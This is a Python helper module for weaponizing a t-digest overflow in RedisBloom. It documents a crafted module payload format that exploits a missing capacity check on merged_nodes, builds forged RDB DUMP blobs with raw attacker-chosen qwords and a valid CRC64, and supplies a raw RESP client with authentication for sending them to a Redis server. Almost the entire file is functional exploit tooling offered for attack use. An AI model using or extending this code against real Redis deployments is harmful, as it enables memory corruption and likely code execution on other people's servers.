#!/usr/bin/env python3
"""P88W_lib.py — shared helpers for the P88M-3 tdigest overflow weaponization.

Payload format (module-IO, RDB_TYPE_MODULE_2, redisbloom TDIS-TYPE):
  07                                  module_2 type byte
  <moduleid len-enc>                  copied verbatim from a real DUMP
  module data:
    04 <8B LE double>  compression    -> td_new(compression): capacity = 6*int(c)+10
    04 <8B>            min
    04 <8B>            max
    02 <rdb_len>       cap            (attacker-controlled, SaveUnsigned encoding)
    02 <rdb_len>       merged_nodes   (validated <= cap, NOT <= capacity)
    02 <rdb_len>       unmerged_nodes
    02 <rdb_len>       total_compressions
    04 <8B>            merged_weight
    04 <8B>            unmerged_weight
    merged_nodes * (04 <8B>)          nodes_mean[i]
    merged_nodes * (04 <8B>)          nodes_weight[i]
  00                                  RDB_MODULE_OPCODE_EOF
  <2B LE rdb version> <8B crc64>
"""
import ctypes
import os
import socket
import struct

_here = os.path.dirname(os.path.abspath(__file__))
_crc = ctypes.CDLL(os.path.join(_here, "libcrc64.so"))
_crc.crc64.restype = ctypes.c_uint64
_crc.crc64_init()

RDB_VERSION = 14
# moduleid+encver for TDIS-TYPE, copied verbatim from a real 8.8.0 DUMP
TDIGEST_MODULEID = bytes.fromhex("814c3212f9360f1000")


def rdb_len(n):
    """Correct RDB length encoding (0x80=32bit, 0x81=64bit markers)."""
    if n < 0x40:
        return bytes([n])
    if n < 0x4000:
        return bytes([0x40 | (n >> 8), n & 0xFF])
    if n <= 0xFFFFFFFF:
        return b"\x80" + struct.pack(">I", n)
    return b"\x81" + struct.pack(">Q", n)


def rdb_str(b):
    return rdb_len(len(b)) + b


def _dbl(raw8):
    """module-IO double: opcode 4 + 8 raw bytes."""
    assert len(raw8) == 8
    return b"\x04" + raw8


def _uint(n):
    return b"\x02" + rdb_len(n)


def q2d(q):
    """qword (int) -> 8 raw LE bytes (for use as a double's raw payload)."""
    return struct.pack("<Q", q & 0xFFFFFFFFFFFFFFFF)


def f2d(f):
    return struct.pack("<d", f)


def build_tdigest_payload(merged_nodes, mean_raws, weight_raws,
                          compression=1.0, cap=None, minv=0.0, maxv=0.0,
                          unmerged=0, compressions=0, mweight=0.0,
                          uweight=0.0):
    """mean_raws / weight_raws: lists of 8-byte strings (raw qwords), each
    len == merged_nodes."""
    assert len(mean_raws) == merged_nodes and len(weight_raws) <= merged_nodes
    if cap is None:
        cap = merged_nodes
    p = b"\x07" + TDIGEST_MODULEID
    p += _dbl(f2d(compression))
    p += _dbl(f2d(minv))
    p += _dbl(f2d(maxv))
    p += _uint(cap)
    p += _uint(merged_nodes)
    p += _uint(unmerged)
    p += _uint(compressions)
    p += _dbl(f2d(mweight))
    p += _dbl(f2d(uweight))
    p += b"".join(_dbl(r) for r in mean_raws)
    p += b"".join(_dbl(r) for r in weight_raws)
    p += b"\x00"                              # RDB_MODULE_OPCODE_EOF
    body = p + struct.pack("<H", RDB_VERSION)
    return body + struct.pack("<Q", _crc.crc64(0, body, len(body)))


def enc(*args):
    out = [b"*%d\r\n" % len(args)]
    for a in args:
        if isinstance(a, str):
            a = a.encode()
        out.append(b"$%d\r\n%s\r\n" % (len(a), a))
    return b"".join(out)


class Resp(object):
    def __init__(self, host, port, pw=None, timeout=15):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.f = self.s.makefile("rb")
        if pw:
            self.cmd("AUTH", pw)

    def cmd(self, *a):
        self.s.sendall(enc(*a))
        return self.read()

    def read(self):
        l = self.f.readline()
        if not l:
            raise ConnectionError("closed")
        t, rest = l[:1], l[1:].rstrip(b"\r\n")
        if t == b"$":
            n = int(rest)
            if n < 0:
                return None
            d = self.f.read(n)
            self.f.read(2)
            return d
        if t == b"*":
            n = int(rest)
            if n < 0:
                return None
            return [self.read() for _ in range(n)]
        return rest

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass
